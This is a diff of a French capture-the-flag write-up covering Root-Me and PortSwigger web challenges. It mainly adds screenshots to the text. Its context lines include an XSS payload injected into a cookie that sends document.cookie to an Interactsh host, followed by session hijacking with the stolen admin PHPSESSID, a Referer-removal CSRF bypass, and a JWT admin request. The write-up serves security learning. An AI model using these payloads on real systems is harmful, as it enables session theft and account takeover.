@@ -434,8 +434,12 @@ PortSwigger recommande donc :
   En arrivant sur le forum, j’ai d’abord testé le fonctionnement normal en soumettant un message simple :
    -Titre : test
    -Message : test
+  <img width="1020" height="275" alt="Capture1" src="https://github.com/user-attachments/assets/dddd4104-b388-4e97-aaa2-075859895dcf" />
+
   ## Observation de la requête avec Burp
   En envoyant un message, j’intercepte via Burp une requête :
+  <img width="507" height="440" alt="Capture2" src="https://github.com/user-attachments/assets/c36d4a67-c932-4cc2-85cc-829bf3c85ee1" />
+
   ```
   POST /web-client/ch19/ HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
@@ -462,6 +466,8 @@ document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie
 </script>
  ```
 Ensuite, j’injecte ce payload dans la valeur du cookie status dans Burp Repeater :
+<img width="1042" height="532" alt="Capture3" src="https://github.com/user-attachments/assets/a81e67e0-fb30-4a65-bb3c-0c24f270fd2a" />
+
  ```
 Cookie: status=aaaa"><script>document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie</script>;
  
@@ -478,11 +484,13 @@ Dans Interactsh, je vois une requête contenant :
 ```
 ?c=PHPSESSID=XXXXXXXXXXXX
 ```
+<img width="1340" height="521" alt="Capture5" src="https://github.com/user-attachments/assets/58e7d803-6bba-42bb-b299-7fd283da6b55" />
 
 🎉 Je possède maintenant le cookie admin.
 ## Usurpation de la session administrateur
 
 Dans mon navigateur :
+<img width="1330" height="240" alt="Capture6" src="https://github.com/user-attachments/assets/16791a40-f263-46c9-b074-4002f755678e" />
 
 -Je vais dans Storage / Cookies.
 -Je remplace ma valeur PHPSESSID par celle volée.
@@ -498,16 +506,18 @@ E5HKEGyCXQVsYaehaqeJs0AfV
 ```
 
 👉 C’est la solution du challenge.
-# Challenge 4:CSRF where Referer validation depends on header being present
+# Challenge 5:CSRF where Referer validation depends on header being present
 ## Analyse du fonctionnement normal
 Après connexion avec :
 ```
 username: wiener  
 password: peter
 ```
-je teste  le changement d’email (image)
+je teste  le changement d’email 
+<img width="1052" height="415" alt="5-2Capture" src="https://github.com/user-attachments/assets/1b892376-2909-4193-8630-6599101e0145" />
+
 Burp Suite intercepte la requête :
-(image)
+
 ## Test du filtre CSRF via Burp Repeater
 test:supprimer complètement le header Referer
 Je supprime la ligne :Referer: ...
@@ -577,7 +587,8 @@ Content-Type: application/json
 
 {"username":"admin","password":"admin"}
 ```
-(image)
+<img width="1107" height="504" alt="6-1Capture" src="https://github.com/user-attachments/assets/b66c0aa1-e830-4da7-af03-bcfda4709372" />
+
 
 Réponse  :
 
@@ -606,6 +617,8 @@ GET /web-serveur/ch63/admin HTTP/1.1
 Host: challenge01.root-me.org
 Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....=
 ```
+<img width="1020" height="444" alt="6-2Capture" src="https://github.com/user-attachments/assets/2a0f6466-e0e9-42a5-977d-354c83aab035" />
+
 🏁 4. Résultat
 
 Le serveur renvoie :
